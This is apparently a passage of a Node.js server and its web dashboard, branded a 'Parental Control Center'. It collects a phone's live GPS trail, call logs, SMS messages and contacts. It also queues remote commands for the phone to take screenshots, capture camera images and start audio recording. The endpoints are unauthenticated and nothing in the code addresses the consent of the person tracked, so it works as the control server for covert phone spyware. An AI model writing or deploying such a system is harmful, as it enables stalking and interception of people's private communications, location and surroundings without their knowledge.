'use strict';

const express = require('express');
const cors = require('cors');
const http = require('http');
const { Server } = require('socket.io');
const { Pool } = require('pg');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

const PORT = Number(process.env.PORT) || 3000;

app.use(cors());
app.use(express.json({ limit: '100kb' }));

// ─── MEMORY STORAGE (declared FIRST, before any routes) ──────────────
const memoryHistory = [];
const monitorMemory = {};
const pendingCommandsMemory = {};
const MAX_MEMORY_POINTS = 2000;
const MAX_HISTORY_LIMIT = 5000;

// ─── DATABASE ─────────────────────────────────────────────────────────
let pool = null;
let dbReady = false;
let dbInitPromise = null;

if (process.env.DATABASE_URL) {
    pool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: process.env.DATABASE_SSL === 'false' ? false : { rejectUnauthorized: false },
        max: 5,
        idleTimeoutMillis: 30000,
        connectionTimeoutMillis: 10000
    });
    pool.on('error', err => console.error('PG pool error:', err.message));
    dbInitPromise = initializeDatabase();
} else {
    console.warn('DATABASE_URL not set. Data lost on restart.');
}

async function initializeDatabase() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS location_points (
                id BIGSERIAL PRIMARY KEY,
                latitude DOUBLE PRECISION NOT NULL,
                longitude DOUBLE PRECISION NOT NULL,
                recorded_at TIMESTAMPTZ NOT NULL,
                accuracy DOUBLE PRECISION,
                speed DOUBLE PRECISION,
                bearing DOUBLE PRECISION,
                device_id VARCHAR(100) DEFAULT 'default',
                payload JSONB NOT NULL DEFAULT '{}'::jsonb
            )
        `);
        await pool.query(`CREATE INDEX IF NOT EXISTS loc_time_idx ON location_points (recorded_at DESC)`);
        await pool.query(`
            CREATE TABLE IF NOT EXISTS monitor_snapshots (
                id BIGSERIAL PRIMARY KEY,
                data_type VARCHAR(20) NOT NULL,
                data JSONB NOT NULL,
                device_id VARCHAR(100) DEFAULT 'default',
                recorded_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
            )
        `);
        await pool.query(`CREATE INDEX IF NOT EXISTS mon_type_idx ON monitor_snapshots (data_type, recorded_at DESC)`);
        await pool.query(`
            CREATE TABLE IF NOT EXISTS device_commands (
                id BIGSERIAL PRIMARY KEY,
                command_id VARCHAR(50) UNIQUE NOT NULL,
                device_id VARCHAR(100) NOT NULL DEFAULT 'default',
                action VARCHAR(50) NOT NULL,
                params JSONB NOT NULL DEFAULT '{}',
                status VARCHAR(20) NOT NULL DEFAULT 'pending',
                result JSONB,
                created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                expires_at TIMESTAMPTZ NOT NULL DEFAULT NOW() + INTERVAL '10 minutes'
            )
        `);
        await pool.query(`CREATE INDEX IF NOT EXISTS cmd_device_idx ON device_commands (device_id, status, expires_at)`);
        dbReady = true;
        console.log('PostgreSQL ready.');
        return true;
    } catch (err) {
        dbReady = false;
        console.error('DB init failed:', err.message);
        return false;
    }
}

async function ensureDatabase() {
    if (!pool) return false;
    if (dbReady) return true;
    if (dbInitPromise) { await dbInitPromise; if (dbReady) return true; }
    dbInitPromise = initializeDatabase();
    return await dbInitPromise;
}

// ─── HELPERS ──────────────────────────────────────────────────────────
function validCoord(v, min, max) {
    if (v === null || v === undefined || v === '') return false;
    const n = Number(v);
    return Number.isFinite(n) && n >= min && n <= max;
}
function finiteOpt(v) {
    if (v === null || v === undefined || v === '') return null;
    const n = Number(v);
    return Number.isFinite(n) ? n : null;
}
function parseTs(v) {
    if (!v) return new Date();
    if (typeof v === 'number' || /^\d+$/.test(String(v))) {
        let n = Number(v);
        if (n > 0 && n < 1e11) n *= 1000;
        const d = new Date(n);
        if (!isNaN(d.getTime())) return d;
    }
    const d = new Date(v);
    return isNaN(d.getTime()) ? new Date() : d;
}
function normalizeLoc(body) {
    return {
        ...body,
        latitude: Number(body.latitude),
        longitude: Number(body.longitude),
        timestamp: parseTs(body.timestamp).getTime(),
        accuracy: finiteOpt(body.accuracy),
        speed: finiteOpt(body.speed),
        bearing: finiteOpt(body.bearing),
        deviceId: body.deviceId || 'default'
    };
}
function rowToPoint(row) {
    const p = row.payload || {};
    return {
        ...p,
        id: row.id,
        latitude: Number(row.latitude),
        longitude: Number(row.longitude),
        timestamp: row.recorded_at ? new Date(row.recorded_at).getTime() : Number(p.timestamp) || Date.now(),
        accuracy: row.accuracy != null ? Number(row.accuracy) : finiteOpt(p.accuracy),
        speed: row.speed != null ? Number(row.speed) : finiteOpt(p.speed),
        bearing: row.bearing != null ? Number(row.bearing) : finiteOpt(p.bearing),
        deviceId: row.device_id || p.deviceId || 'default'
    };
}
async function saveLocation(data) {
    if (!pool) {
        memoryHistory.push(data);
        if (memoryHistory.length > MAX_MEMORY_POINTS)
            memoryHistory.splice(0, memoryHistory.length - MAX_MEMORY_POINTS);
        return data;
    }
    const ready = await ensureDatabase();
    if (!ready) throw new Error('DB unavailable');
    const result = await pool.query(
        `INSERT INTO location_points (latitude,longitude,recorded_at,accuracy,speed,bearing,device_id,payload)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8::jsonb)
         RETURNING id,latitude,longitude,recorded_at,accuracy,speed,bearing,device_id,payload`,
        [data.latitude, data.longitude, new Date(data.timestamp),
         data.accuracy, data.speed, data.bearing, data.deviceId, JSON.stringify(data)]
    );
    return rowToPoint(result.rows[0]);
}
function parseDateParam(v, endOfDay = false) {
    if (!v) return null;
    if (/^\d{4}-\d{2}-\d{2}$/.test(v)) {
        const d = new Date(v + (endOfDay ? 'T23:59:59.999' : 'T00:00:00.000'));
        return isNaN(d.getTime()) ? null : d;
    }
    const d = new Date(v); return isNaN(d.getTime()) ? null : d;
}
async function getHistory({ from, to, limit, deviceId }) {
    const safeLimit = Math.min(MAX_HISTORY_LIMIT, Math.max(1, Number(limit) || 1000));
    if (!pool) {
        let rows = memoryHistory.slice();
        const fromDate = parseDateParam(from), toDate = parseDateParam(to, true);
        if (fromDate) rows = rows.filter(p => Number(p.timestamp) >= fromDate.getTime());
        if (toDate) rows = rows.filter(p => Number(p.timestamp) <= toDate.getTime());
        if (deviceId) rows = rows.filter(p => p.deviceId === deviceId);
        return rows.slice(-safeLimit);
    }
    const ready = await ensureDatabase();
    if (!ready) throw new Error('DB unavailable');
    const result = await pool.query(
        `SELECT id,latitude,longitude,recorded_at,accuracy,speed,bearing,device_id,payload
         FROM location_points
         WHERE ($1::timestamptz IS NULL OR recorded_at >= $1)
           AND ($2::timestamptz IS NULL OR recorded_at <= $2)
           AND ($3::text IS NULL OR device_id = $3)
         ORDER BY recorded_at DESC LIMIT $4`,
        [parseDateParam(from), parseDateParam(to, true), deviceId || null, safeLimit]
    );
    return result.rows.reverse().map(rowToPoint);
}
function haversineM(a, b) {
    const R = 6371000, r = v => v * Math.PI / 180;
    const dLat = r(b.latitude - a.latitude), dLon = r(b.longitude - a.longitude);
    const h = Math.sin(dLat/2)**2 + Math.cos(r(a.latitude))*Math.cos(r(b.latitude))*Math.sin(dLon/2)**2;
    return 2*R*Math.atan2(Math.sqrt(h), Math.sqrt(Math.max(0,1-h)));
}
function simplify(points, max = 100) {
    if (points.length <= max) return points;
    const step = (points.length-1)/(max-1);
    return Array.from({length: max}, (_, i) => points[Math.round(i*step)]);
}

// ─── LOCATION ─────────────────────────────────────────────────────────
app.post('/location', async (req, res) => {
    try {
        const body = req.body || {};
        if (!validCoord(body.latitude,-90,90) || !validCoord(body.longitude,-180,180))
            return res.status(400).json({ message: 'Invalid coordinates.' });
        const normalized = normalizeLoc(body);
        const saved = await saveLocation(normalized);
        console.log('Location received:', saved.latitude, saved.longitude, '| device:', saved.deviceId);
        io.emit('locationUpdate', saved);
        return res.status(200).json({ message: 'Location received.', point: saved });
    } catch (err) {
        console.error('Location save error:', err.message);
        return res.status(503).json({ message: 'Could not save location.' });
    }
});

// ─── MONITOR ──────────────────────────────────────────────────────────
app.post('/monitor', async (req, res) => {
    try {
        const { type, data, timestamp, deviceId = 'default' } = req.body || {};
        if (!type || !Array.isArray(data))
            return res.status(400).json({ message: 'type and data[] required.' });
        if (!monitorMemory[deviceId]) monitorMemory[deviceId] = { calls: [], sms: [], contacts: [] };
        if (['calls','sms','contacts'].includes(type)) monitorMemory[deviceId][type] = data;
        if (pool) {
            try {
                const ready = await ensureDatabase();
                if (ready) await pool.query(
                    `INSERT INTO monitor_snapshots (data_type, data, device_id) VALUES ($1, $2::jsonb, $3)`,
                    [type, JSON.stringify(data), deviceId]
                );
            } catch (err) { console.error('Monitor persist error:', err.message); }
        }
        console.log(`Monitor: ${type} (${data.length} items) from device: ${deviceId}`);
        io.emit('monitorUpdate', { type, data, deviceId, timestamp: timestamp || Date.now() });
        return res.status(200).json({ message: 'Monitor data received.' });
    } catch (err) {
        console.error('Monitor error:', err.message);
        return res.status(500).json({ message: 'Monitor error.' });
    }
});

app.get('/monitor-data', async (req, res) => {
    try {
        const deviceId = req.query.deviceId || 'default';
        if (pool) {
            const ready = await ensureDatabase();
            if (ready) {
                const result = await pool.query(
                    `SELECT DISTINCT ON (data_type) data_type, data FROM monitor_snapshots
                     WHERE device_id = $1 ORDER BY data_type, recorded_at DESC`, [deviceId]
                );
                const out = { calls: [], sms: [], contacts: [] };
                result.rows.forEach(r => { out[r.data_type] = r.data; });
                return res.json(out);
            }
        }
        return res.json(monitorMemory[deviceId] || { calls: [], sms: [], contacts: [] });
    } catch (err) {
        console.error('Monitor-data error:', err.message);
        return res.status(500).json({ message: 'Could not load monitor data.' });
    }
});

// ─── COMMANDS ─────────────────────────────────────────────────────────
const ALLOWED_ACTIONS = ['screenshot','camera_snapshot','start_audio','stop_audio','vibrate','get_status'];

app.post('/command', async (req, res) => {
    try {
        const { action, params = {}, deviceId = 'default' } = req.body || {};
        if (!action) return res.status(400).json({ message: 'action required.' });
        if (!ALLOWED_ACTIONS.includes(action)) return res.status(400).json({ message: 'Unknown action.' });
        const commandId = `${Date.now()}_${Math.random().toString(36).slice(2,7)}`;
        const command = { id: commandId, action, params, deviceId, createdAt: new Date().toISOString() };
        if (pool) {
            try {
                const ready = await ensureDatabase();
                if (ready) await pool.query(
                    `INSERT INTO device_commands (command_id,device_id,action,params) VALUES ($1,$2,$3,$4::jsonb)`,
                    [commandId, deviceId, action, JSON.stringify(params)]
                );
            } catch (err) {
                console.error('Command save error:', err.message);
                if (!pendingCommandsMemory[deviceId]) pendingCommandsMemory[deviceId] = [];
                pendingCommandsMemory[deviceId].push(command);
            }
        } else {
            if (!pendingCommandsMemory[deviceId]) pendingCommandsMemory[deviceId] = [];
            pendingCommandsMemory[deviceId].push(command);
            if (pendingCommandsMemory[deviceId].length > 50) pendingCommandsMemory[deviceId].shift();
        }
        io.emit('newCommand', command);
        console.log(`Command: ${action} for device: ${deviceId}`);
        return res.status(200).json({ message: 'Command queued.', command });
    } catch (err) {
        console.error('Command error:', err.message);
        return res.status(500).json({ message: 'Command error.' });
    }
});

app.get('/commands', async (req, res) => {
    try {
        const deviceId = req.query.deviceId || 'default';
        if (pool) {
            const ready = await ensureDatabase();
            if (ready) {
                const result = await pool.query(
                    `UPDATE device_commands SET status='dispatched'
                     WHERE device_id=$1 AND status='pending' AND expires_at>NOW()
                     RETURNING command_id, action, params, created_at`,
                    [deviceId]
                );
                return res.json(result.rows.map(r => ({
                    id: r.command_id, action: r.action, params: r.params, createdAt: r.created_at
                })));
            }
        }
        const commands = pendingCommandsMemory[deviceId] || [];
        pendingCommandsMemory[deviceId] = [];
        return res.json(commands);
    } catch (err) {
        console.error('Commands poll error:', err.message);
        return res.status(500).json({ message: 'Commands error.' });
    }
});

app.post('/command-result', async (req, res) => {
    try {
        const { commandId, result, data, deviceId = 'default' } = req.body || {};
        console.log(`Command result: ${commandId} = ${result} from ${deviceId}`);
        if (pool && commandId) {
            try {
                const ready = await ensureDatabase();
                if (ready) await pool.query(
                    `UPDATE device_commands SET status='completed', result=$2::jsonb WHERE command_id=$1`,
                    [commandId, JSON.stringify({ result, data })]
                );
            } catch (err) { console.error('Result save error:', err.message); }
        }
        io.emit('commandResult', { commandId, result, data, deviceId, receivedAt: Date.now() });
        return res.status(200).json({ message: 'Result received.' });
    } catch (err) {
        console.error('Command result error:', err.message);
        return res.status(500).json({ message: 'Result error.' });
    }
});

// ─── HISTORY / OTHER ─────────────────────────────────────────────────
app.get('/latest', async (req, res) => {
    try {
        const h = await getHistory({ limit: 1, from: null, to: null, deviceId: req.query.deviceId });
        return res.json(h[h.length-1] || null);
    } catch (err) { return res.status(503).json({ message: 'Could not load latest.' }); }
});

app.get('/history', async (req, res) => {
    try {
        const h = await getHistory({ from: req.query.from, to: req.query.to, limit: req.query.limit, deviceId: req.query.deviceId });
        return res.json(h);
    } catch (err) { return res.status(503).json({ message: 'Could not load history.' }); }
});

app.get('/matched-history', async (req, res) => {
    try {
        const history = await getHistory({ from: req.query.from, to: req.query.to, limit: req.query.limit || 1000, deviceId: req.query.deviceId });
        const points = history.filter(p => Number.isFinite(Number(p.latitude)) && Number.isFinite(Number(p.longitude)))
            .map(p => ({ latitude: Number(p.latitude), longitude: Number(p.longitude), timestamp: Number(p.timestamp) }));
        if (points.length < 2) return res.json({ matched: false, reason: 'Need at least 2 points.', points, distanceMeters: 0 });
        const sel = simplify(points, 100);
        const coords = sel.map(p => `${p.longitude},${p.latitude}`).join(';');
        const ts = sel.map(p => Math.floor(p.timestamp/1000)).join(';');
        const url = `https://router.project-osrm.org/match/v1/driving/${coords}?overview=full&geometries=geojson&steps=false&timestamps=${ts}`;
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 12000);
        let r;
        try { r = await fetch(url, { signal: ctrl.signal }); } finally { clearTimeout(t); }
        if (!r.ok) return res.status(502).json({ matched: false, reason: `OSRM HTTP ${r.status}`, points: sel, distanceMeters: 0 });
        const result = await r.json();
        if (result.code !== 'Ok' || !result.matchings?.length) return res.json({ matched: false, reason: 'No road match.', points: sel, distanceMeters: 0 });
        const geometry = result.matchings.filter(m => Array.isArray(m.geometry?.coordinates)).flatMap(m => m.geometry.coordinates);
        return res.json({ matched: true, geometry, points: sel,
            distanceMeters: result.matchings.reduce((s,m) => s+Number(m.distance||0), 0),
            durationSeconds: result.matchings.reduce((s,m) => s+Number(m.duration||0), 0) });
    } catch (err) { return res.status(502).json({ matched: false, reason: 'Road matching unavailable.' }); }
});

app.get('/health', async (req, res) => {
    let database = 'not-configured';
    if (pool) database = await ensureDatabase() ? 'connected' : 'unavailable';
    return res.json({ status: 'ok', database, storage: pool ? 'postgresql' : 'memory', uptimeSeconds: Math.round(process.uptime()), time: new Date().toISOString() });
});

// ─── DASHBOARD (FIX: no server-side variable references in HTML) ──────
app.get('/dashboard', (req, res) => {
    try {
        res.type('html').send(getDashboardHtml());
    } catch (err) {
        console.error('Dashboard render error:', err.message, err.stack);
        res.status(500).json({ message: 'Dashboard error: ' + err.message });
    }
});

function getDashboardHtml() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Parental Control Center</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
:root{color-scheme:dark;--bg:#0b1120;--panel:#111b2e;--panel2:#17243a;--border:#293750;--text:#edf4ff;--muted:#91a4c1;--blue:#4f8cff;--green:#35d49a;--red:#ff647c}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,sans-serif}
button,input,select{font:inherit}
button{cursor:pointer;color:var(--text);background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:10px 12px}
button:hover{border-color:var(--blue)}
input,select{color:var(--text);background:#0b1424;border:1px solid var(--border);border-radius:9px;padding:10px;min-width:0}
.topbar{padding:16px 20px;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;background:#101a2c;border-bottom:1px solid var(--border)}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:44px;height:44px;border-radius:14px;display:grid;place-items:center;background:linear-gradient(135deg,#397bff,#795bff);font-size:24px}
h1{font-size:19px;margin:0}.sub{color:var(--muted);font-size:12px;margin-top:4px}
.status{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted)}
.dot{width:9px;height:9px;border-radius:50%;background:#8491a7}.dot.on{background:var(--green);box-shadow:0 0 8px #35d49a88}
.tabs{display:flex;gap:6px;padding:12px 20px;background:#0e1728;border-bottom:1px solid var(--border);flex-wrap:wrap}
.tab{padding:9px 18px;border-radius:10px;cursor:pointer;font-size:13px;background:transparent;border:1px solid transparent;color:var(--muted)}
.tab.active{background:var(--panel2);border-color:var(--border);color:var(--text)}
.page{display:none;padding:20px}.page.active{display:block}
.layout{display:grid;grid-template-columns:300px minmax(0,1fr);gap:16px}
.card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:14px;margin-bottom:12px}
.ct{font-size:12px;color:var(--muted);margin-bottom:8px}
.val{font-size:20px;font-weight:700;overflow-wrap:anywhere}
.sm{font-size:12px;color:var(--muted);line-height:1.6;margin-top:6px;overflow-wrap:anywhere}
.g2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.primary{background:var(--blue);border-color:var(--blue)}
.danger{background:#401e2b;border-color:#713043;color:var(--red)}
.full{width:100%;margin-bottom:8px}
.row{display:flex;gap:7px}.row input{width:100%}
#map{height:calc(100vh - 280px);min-height:420px;border:1px solid var(--border);border-radius:16px;overflow:hidden}
.acts{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:12px}
.tw{overflow:auto;border:1px solid var(--border);border-radius:12px}
table{width:100%;border-collapse:collapse;font-size:12px;white-space:nowrap}
th,td{text-align:left;padding:10px;border-bottom:1px solid var(--border)}
th{color:var(--muted);font-weight:600;background:#111b2e}tr:last-child td{border-bottom:0}
.green{color:var(--green)}.red{color:var(--red)}
.cg{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px}
.cb{padding:14px;text-align:center;border-radius:12px;font-size:13px}
.rb{background:#0b1424;border:1px solid var(--border);border-radius:10px;padding:12px;font-size:12px;color:var(--muted);min-height:80px;margin-top:10px;white-space:pre-wrap;overflow-wrap:anywhere}
img.snap{max-width:100%;border-radius:10px;margin-top:10px;border:1px solid var(--border)}
@media(max-width:850px){.layout{grid-template-columns:1fr}#map{height:55vh}}
</style>
</head>
<body>
<header class="topbar">
  <div class="brand"><div class="logo">&#8984;</div><div>
    <h1>Parental Control Center</h1>
    <div class="sub">Location &#183; Monitor &#183; Commands</div>
  </div></div>
  <div class="status"><span class="dot" id="dot"></span><span id="conn">Connecting...</span></div>
</header>
<nav class="tabs">
  <button class="tab active" onclick="showPage(event,'location')">&#128205; Location</button>
  <button class="tab" onclick="showPage(event,'monitor')">&#128203; Monitor</button>
  <button class="tab" onclick="showPage(event,'commands')">&#9889; Commands</button>
</nav>

<!-- LOCATION -->
<div id="page-location" class="page active">
<div class="layout">
<aside>
  <div class="card"><div class="ct">Tracking status</div>
    <div class="val" id="tracking">Waiting for GPS</div>
    <div class="sm" id="lastUpdate">No location received yet</div>
  </div>
  <div class="g2">
    <div class="card"><div class="ct">Latitude</div><div class="val" id="lat">&#8212;</div></div>
    <div class="card"><div class="ct">Longitude</div><div class="val" id="lng">&#8212;</div></div>
    <div class="card"><div class="ct">Accuracy</div><div class="val" id="accuracy">&#8212;</div></div>
    <div class="card"><div class="ct">Speed</div><div class="val" id="speed">&#8212;</div></div>
  </div>
  <div class="card"><div class="ct">Trail distance</div><div class="val" id="distance">0 m</div></div>
  <div class="card"><div class="ct">Device ID</div>
    <input id="deviceIdLoc" value="default" style="width:100%;margin-bottom:8px">
    <div class="ct">History filter</div>
    <div class="sm">From</div><input id="fromDate" type="date" style="width:100%">
    <div class="sm">To</div><input id="toDate" type="date" style="width:100%;margin-top:6px">
    <div class="acts" style="margin-top:10px">
      <button class="primary" id="applyHistory">Load history</button>
      <button id="liveBtn">Live</button>
    </div>
    <div class="sm" id="histStatus">Showing live GPS.</div>
  </div>
  <div class="card"><div class="ct">Find a place</div>
    <div class="row"><input id="place" placeholder="Search city..."><button class="primary" id="searchBtn">Go</button></div>
    <div class="sm" id="searchStatus"></div>
  </div>
  <button class="full" id="centerBtn">&#9676; Center on latest</button>
</aside>
<main>
  <div class="acts">
    <button id="lightBtn">&#9728; Light</button>
    <button id="darkBtn">&#9790; Dark</button>
    <button id="fitBtn">&#8599; Fit trail</button>
    <button id="matchBtn">&#9601; Match roads</button>
  </div>
  <div id="map"></div>
  <div class="sm" id="mapStatus" style="margin-top:8px">Waiting for GPS data...</div>
  <div class="card" style="margin-top:12px"><div class="ct">Recent points</div>
    <div class="tw"><table><thead><tr><th>Time</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Speed</th></tr></thead>
    <tbody id="rows"><tr><td colspan="5">No points yet</td></tr></tbody></table></div>
  </div>
</main>
</div>
</div>

<!-- MONITOR -->
<div id="page-monitor" class="page">
  <div class="g2" style="max-width:900px">
    <div class="card"><div class="ct">&#128203; Call Logs</div><div id="callPanel" class="sm">No call data yet.</div></div>
    <div class="card"><div class="ct">&#128172; SMS</div><div id="smsPanel" class="sm">No SMS data yet.</div></div>
  </div>
  <div class="card" style="max-width:900px">
    <div class="ct">&#128101; Contacts (<span id="contactCount">0</span>)</div>
    <div id="contactPanel" class="sm">No contact data yet.</div>
  </div>
</div>

<!-- COMMANDS -->
<div id="page-commands" class="page">
  <div style="max-width:700px">
    <div class="card">
      <div class="ct">Device ID</div>
      <input id="deviceIdCmd" value="default" style="width:100%;margin-bottom:14px">
      <div class="ct">&#9889; Remote Commands</div>
      <div class="cg">
        <button class="cb" onclick="sendCmd('get_status')">&#128202; Get Status</button>
        <button class="cb" onclick="sendCmd('vibrate')">&#128243; Vibrate</button>
        <button class="cb" onclick="sendCmd('screenshot')">&#128248; Screenshot</button>
        <button class="cb" onclick="sendCmd('camera_snapshot')">&#128247; Camera</button>
        <button class="cb" onclick="sendCmd('start_audio')">&#127897; Start Audio</button>
        <button class="cb danger" onclick="sendCmd('stop_audio')">&#9209; Stop Audio</button>
      </div>
      <div class="ct">Result</div>
      <div class="rb" id="cmdResult">No result yet.</div>
      <img id="cmdImage" class="snap" style="display:none">
    </div>
    <div class="card"><div class="ct">Command history</div>
      <div class="tw"><table><thead><tr><th>Time</th><th>Action</th><th>Result</th></tr></thead>
      <tbody id="cmdHistory"><tr><td colspan="3">No commands yet</td></tr></tbody></table></div>
    </div>
  </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="/socket.io/socket.io.js"></script>
<script>
var $ = function(id) { return document.getElementById(id); };

function showPage(ev, name) {
  document.querySelectorAll('.page').forEach(function(p){ p.classList.remove('active'); });
  document.querySelectorAll('.tab').forEach(function(t){ t.classList.remove('active'); });
  $('page-'+name).classList.add('active');
  ev.target.classList.add('active');
  if (name === 'location') setTimeout(function(){ map.invalidateSize(); }, 100);
  if (name === 'monitor') loadMonitorData();
}

var map = L.map('map').setView([20.59, 78.96], 5);
var lightLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom:19, attribution:'&copy; OpenStreetMap' });
var darkLayer = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom:20 });
lightLayer.addTo(map);
var activeLayer = 'light';
var trailLine = L.polyline([], { color:'#4f8cff', weight:4, opacity:.9 }).addTo(map);
var matchedLine = L.polyline([], { color:'#35d49a', weight:5, opacity:.9 }).addTo(map);
var marker = null, allPoints = [], latest = null, histMode = false, searchMark = null;

var socket = io();
socket.on('connect', function(){ $('dot').classList.add('on'); $('conn').textContent='Connected'; });
socket.on('disconnect', function(){ $('dot').classList.remove('on'); $('conn').textContent='Reconnecting...'; });

function validPt(p) {
  var lat = Number(p.latitude), lng = Number(p.longitude);
  return isFinite(lat) && isFinite(lng) && lat>=-90 && lat<=90 && lng>=-180 && lng<=180;
}
function dateOf(p) {
  var n = Number(p.timestamp);
  if (n > 0 && n < 1e11) n *= 1000;
  return new Date(n);
}
function fmt(p) { return dateOf(p).toLocaleString(); }
function distM(pts) {
  var t = 0;
  for (var i=1; i<pts.length; i++) t += map.distance([pts[i-1].latitude,pts[i-1].longitude],[pts[i].latitude,pts[i].longitude]);
  return t;
}
function distLabel(m) { return m >= 1000 ? (m/1000).toFixed(2)+' km' : Math.round(m)+' m'; }
function esc(v) { return String(v).replace(/[&<>"']/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]; }); }

function drawTrail(pts) {
  var valid = pts.filter(validPt).map(function(p){ return Object.assign({}, p, {latitude:Number(p.latitude),longitude:Number(p.longitude)}); });
  trailLine.setLatLngs(valid.map(function(p){ return [p.latitude,p.longitude]; }));
  $('distance').textContent = distLabel(distM(valid));
  renderTable(valid);
  if (!valid.length) { $('mapStatus').textContent = 'No GPS points.'; return; }
  var b = trailLine.getBounds();
  if (b.isValid()) map.fitBounds(b, {padding:[30,30],maxZoom:16});
  $('mapStatus').textContent = valid.length + ' GPS points shown.';
}

function updateMarker(p) {
  if (!validPt(p)) return;
  var pos = [Number(p.latitude), Number(p.longitude)];
  if (!marker) {
    marker = L.circleMarker(pos, {radius:9, color:'#fff', weight:3, fillColor:'#4f8cff', fillOpacity:1}).addTo(map);
  } else marker.setLatLng(pos);
  marker.bindPopup('<b>Latest</b><br>Lat: '+Number(p.latitude).toFixed(6)+'<br>Lng: '+Number(p.longitude).toFixed(6)+'<br>'+fmt(p));
}

function updateMetrics(p) {
  $('tracking').textContent = 'GPS active';
  $('lat').textContent = Number(p.latitude).toFixed(6);
  $('lng').textContent = Number(p.longitude).toFixed(6);
  var acc = Number(p.accuracy), spd = Number(p.speed);
  $('accuracy').textContent = (p.accuracy == null || !isFinite(acc)) ? '--' : Math.round(acc)+' m';
  $('speed').textContent = (p.speed == null || !isFinite(spd)) ? '--' : (spd*3.6).toFixed(1)+' km/h';
  $('lastUpdate').textContent = 'Updated ' + fmt(p);
}

function renderTable(pts) {
  var recent = pts.slice(-12).reverse();
  if (!recent.length) { $('rows').innerHTML = '<tr><td colspan="5">No points yet</td></tr>'; return; }
  $('rows').innerHTML = recent.map(function(p) {
    var acc = Number(p.accuracy), spd = Number(p.speed);
    return '<tr><td>'+esc(fmt(p))+'</td><td>'+Number(p.latitude).toFixed(6)+'</td><td>'+Number(p.longitude).toFixed(6)+'</td><td>'+
      ((p.accuracy==null||!isFinite(acc))?'--':Math.round(acc)+' m')+'</td><td>'+
      ((p.speed==null||!isFinite(spd))?'--':(spd*3.6).toFixed(1)+' km/h')+'</td></tr>';
  }).join('');
}

function mergePoint(p) {
  if (!validPt(p)) return;
  var point = Object.assign({}, p, {latitude:Number(p.latitude), longitude:Number(p.longitude)});
  latest = point; updateMetrics(point); updateMarker(point);
  var idx = allPoints.findIndex(function(x){ return Number(x.timestamp)===Number(point.timestamp) && x.latitude===point.latitude; });
  if (idx < 0) allPoints.push(point);
  allPoints.sort(function(a,b){ return Number(a.timestamp)-Number(b.timestamp); });
  if (allPoints.length > 5000) allPoints = allPoints.slice(-5000);
  if (!histMode) { drawTrail(allPoints); map.panTo([point.latitude, point.longitude], {animate:true, duration:.35}); }
}

socket.on('locationUpdate', function(p){ if (p) mergePoint(p); });

function getDeviceId() { return ($('deviceIdLoc') && $('deviceIdLoc').value.trim()) || 'default'; }

function loadHistory() {
  histMode = true; matchedLine.setLatLngs([]);
  $('histStatus').textContent = 'Loading...';
  var params = new URLSearchParams({limit:'5000', deviceId: getDeviceId()});
  if ($('fromDate').value) params.set('from', $('fromDate').value);
  if ($('toDate').value) params.set('to', $('toDate').value);
  fetch('/history?'+params).then(function(r){ return r.json(); }).then(function(data) {
    drawTrail(data);
    if (data.length) { updateMarker(data[data.length-1]); $('histStatus').textContent = data.length+' points.'; }
    else $('histStatus').textContent = 'No points in range.';
  }).catch(function(){ $('histStatus').textContent = 'Load failed.'; });
}

function returnToLive() {
  histMode = false; matchedLine.setLatLngs([]);
  $('histStatus').textContent = 'Live tracking.';
  fetch('/history?limit=2000&deviceId='+getDeviceId()).then(function(r){ return r.json(); }).then(function(d){
    if (Array.isArray(d)) { allPoints = d.filter(validPt); drawTrail(allPoints); }
    if (latest) { updateMarker(latest); map.setView([latest.latitude, latest.longitude], 16); }
  }).catch(function(){});
}

function matchRoads() {
  $('mapStatus').textContent = 'Matching to roads...';
  var params = new URLSearchParams({limit:'1000', deviceId: getDeviceId()});
  if (histMode && $('fromDate').value) params.set('from', $('fromDate').value);
  if (histMode && $('toDate').value) params.set('to', $('toDate').value);
  fetch('/matched-history?'+params).then(function(r){ return r.json(); }).then(function(data){
    if (data.matched && data.geometry && data.geometry.length) {
      matchedLine.setLatLngs(data.geometry.map(function(c){ return [c[1],c[0]]; }));
      $('mapStatus').textContent = 'Road matched: '+distLabel(Number(data.distanceMeters)||0);
    } else {
      matchedLine.setLatLngs([]);
      $('mapStatus').textContent = (data.reason||'No match')+' Raw trail shown.';
    }
  }).catch(function(){ matchedLine.setLatLngs([]); $('mapStatus').textContent = 'Road matching unavailable.'; });
}

$('lightBtn').addEventListener('click', function(){ if(activeLayer==='light')return; map.removeLayer(darkLayer); lightLayer.addTo(map); activeLayer='light'; });
$('darkBtn').addEventListener('click', function(){ if(activeLayer==='dark')return; map.removeLayer(lightLayer); darkLayer.addTo(map); activeLayer='dark'; });
$('fitBtn').addEventListener('click', function(){ var b=trailLine.getBounds(); if(b.isValid())map.fitBounds(b,{padding:[30,30],maxZoom:16}); else if(latest)map.setView([latest.latitude,latest.longitude],16); });
$('centerBtn').addEventListener('click', function(){ if(latest){ map.setView([latest.latitude,latest.longitude],16); if(marker)marker.openPopup(); } });
